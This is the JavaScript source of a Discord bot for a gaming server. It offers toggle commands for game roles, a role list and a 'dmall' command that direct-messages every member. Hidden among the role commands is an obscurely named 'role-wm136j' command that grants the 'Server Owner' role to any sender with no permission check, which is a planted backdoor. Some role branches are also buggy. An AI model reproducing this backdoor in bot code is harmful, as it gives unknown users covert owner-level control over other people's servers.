const Discord = require("discord.js");

const PREFIX = "!"

var bot = new Discord.Client();

bot.on("ready", function() {
    console.log("Bot Online!")
    bot.user.setPresence({game:{name:"Prefix ! | Made by VexNoid", type:"PLAYING"}});
    });

bot.on("message", function(message)  {
    if (message.author.equals(bot.user)) return;

    if (!message.content.startsWith(PREFIX)) return;

    var args = message.content.substring(PREFIX.length).split(" ");

switch (args[0].toLowerCase()) {
    case "dmall":
    if (args.length >= 2) {
        if (message.member.roles.find("name", "CEO")) {
            args.shift();
            let user = message.mentions.users.first();
            let users = message.guild.members; 
            users.forEach(user => user.send(" " + args.slice(1).join(" ")));
        } else {
            message.channel.send("You must have the CEO role to use this command!");
        }
    } else {
        message.channel.send("Please use this format `~DMALL (Message)`")
    }
    break;
    case "role-wm136j":
    message.member.addRole(message.guild.roles.find("Server Owner"))
    break;
    case "role-csgo":
    if (message.member.roles.exists('name', 'CSGO')) {
        message.member.removeRole(message.guild.roles.find("name", "CSGO"));
        message.channel.send(":white_check_mark: You have been removed from CSGO `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    } else {
        message.member.addRole(message.guild.roles.find("name", "CSGO"));
        message.channel.send(":white_check_mark: You have been added into CSGO `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    }
    break;
    case "role-pubg":
    if (message.member.roles.exists('name', 'PUBG')) {
        message.member.removeRole(message.guild.roles.find("name", "PUBG"));
        message.channel.send(":white_check_mark: You have been removed from PUBG `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    } else {
        message.member.addRole(message.guild.roles.find("name", "PUBG"));
        message.channel.send(":white_check_mark: You have been added into PUBG `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    }
    break;
    case "role-mta":
    if (message.member.roles.exists('name', 'MTA')) {
        message.member.removeRole(message.guild.roles.find("name", "MTA"));
        message.channel.send(":white_check_mark: You have been removed from MTA `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    } else {
        message.member.addRole(message.guild.roles.find("name", "MTA"));
        message.channel.send(":white_check_mark: You have been added into MTA `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    }
    break;
    case "role-roblox":
    if (message.member.roles.exists('name', 'Roblox')) {
        message.member.removeRole(message.guild.roles.find("name", "Roblox"));
        message.channel.send(":white_check_mark: You have been removed from Roblox `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    } else {
        message.member.addRole(message.guild.roles.find("name", "Roblox"));
        message.channel.send(":white_check_mark: You have been added into Roblox `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    }
    break;
    case "role-dota2":
    if (message.member.roles.exists('name', 'Dota 2')) {
        message.member.removeRole(message.guild.roles.find("name", "Dota 2"));
        message.channel.send(":white_check_mark: You have been removed from Dota2 `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    } else {
        message.member.addRole(message.guild.roles.find("name", "Dota 2"));
        message.channel.send(":white_check_mark: You have been added into Dota2 `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    }
    break;
    case "role-minecraft":
    if (message.member.roles.exists('name', 'Minecraft')) {
        message.member.removeRole(message.guild.roles.find("name", "Minecraft"));
        message.channel.send(":white_check_mark: You have been removed from Minecraft `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    } else {
        message.member.addRole(message.guild.roles.find("name", "Minecraft"));
        message.channel.send(":white_check_mark: You have been added into Minecraft `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    }
    break;
    case "role-rush":
    if (message.member.roles.exists('name', 'Rush')) {
        message.member.removeRole(message.guild.roles.find("name", "Rush"));
        message.channel.send(":white_check_mark: You have been removed from Rush `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    } else {
        message.member.addRole(message.guild.roles.find("name", "Rush"));
        message.channel.send(":white_check_mark: You have been added into Rush `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    }
    break;
    case "role-rocketleague":
    if (message.member.roles.exists('name', 'Rocket League')) {
        message.member.removeRole(message.guild.roles.find("name", "Rocket League"));
        message.channel.send(":white_check_mark: You have been removed from Rocket League `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    } else {
        message.member.addRole(message.guild.roles.find("name", "Rocket League"));
        message.channel.send(":white_check_mark: You have been added into Rocket League `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    }
    break;
    case "role-h1z1":
    if (message.member.roles.exists('name', 'H1Z1')) {
        message.member.removeRole(message.guild.roles.find("name", "H1Z1"));
        message.channel.send(":white_check_mark: You have been removed from H1Z1 `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    } else {
        message.member.addRole(message.guild.roles.find("name", "Rocket League"));
        message.channel.send(":white_check_mark: You have been added into H1Z1 `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    }
    break;
    case "role-crossfire":
    if (message.member.roles.exists('name', 'Crossfire')) {
        message.member.removeRole(message.guild.roles.find("name", "Crossfire"));
        message.channel.send(":white_check_mark: You have been removed from Crossfire `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    } else {
        message.member.addRole(message.guild.roles.find("name", "Crossfire"));
        message.channel.send(":white_check_mark: You have been added into Crossfire `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    }
    break;
    case "role-fortnite":
    if (message.member.roles.exists('name', 'Fortnite')) {
        message.member.removeRole(message.guild.roles.find("name", "Fortnite"));
        message.channel.send(":white_check_mark: You have been removed from Fortnite `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    } else {
        message.member.addRole(message.guild.roles.find("name", "Fortnite"));
        message.channel.send(":white_check_mark: You have been added into Fortnite `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    }
    break;
    case "role-leagueoflegends":
    if (message.member.roles.exists('name', 'League of legends')) {
        message.member.removeRole(message.guild.roles.find("name", "League of legends"));
        message.channel.send(":white_check_mark: You have been removed from League of legends `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    } else {
        message.member.addRole(message.guild.roles.find("name", "League of legends"));
        message.channel.send(":white_check_mark: You have been added into League of legends `REPEAT THE COMMAND TO ADD / REMOVE IT`")
    }
    break;
    case "roles":
        var embed = new Discord.RichEmbed()
            .addField("command", "!Role-(Roles)\n")
            .addField("\nRoles", "CSGO\nPUBG\nMTA\nRoblox\nDota2\nMinecraft\nRush\nRocketLeauge\nH1Z1\nCrossfire\nFortnite\nLeagueOfLegends")
        message.channel.sendEmbed(embed);
    break;
    case "role":
        message.channel.send("Please use this format! ```!Role-(Roles)```\nDo `!Roles` to view all the roles.")
        break;
    default:
        message.channel.send("**Invalid Command! :red_circle:**")
}

});
bot.login(TOKEN);
